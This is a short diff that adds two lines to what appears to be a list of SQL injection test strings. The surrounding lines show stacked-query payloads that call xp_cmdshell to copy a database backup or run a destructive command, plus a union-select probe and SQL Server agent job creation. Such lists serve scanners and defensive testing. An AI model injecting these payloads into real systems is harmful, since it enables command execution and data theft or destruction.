@@ -469,6 +469,8 @@ sin(1)-1 group by 1 union select 1--
 1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
 1); USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
 
+EXEC sp_add_job @job_name = 'TestJob';
+EXECUTE sp_add_job @job_name = 'TestJob';
 1;EXECUTE sp_add_job @job_name = 'TestJob';
 1;print 'foo'; exec xp_cmdshell 'destroy';
 
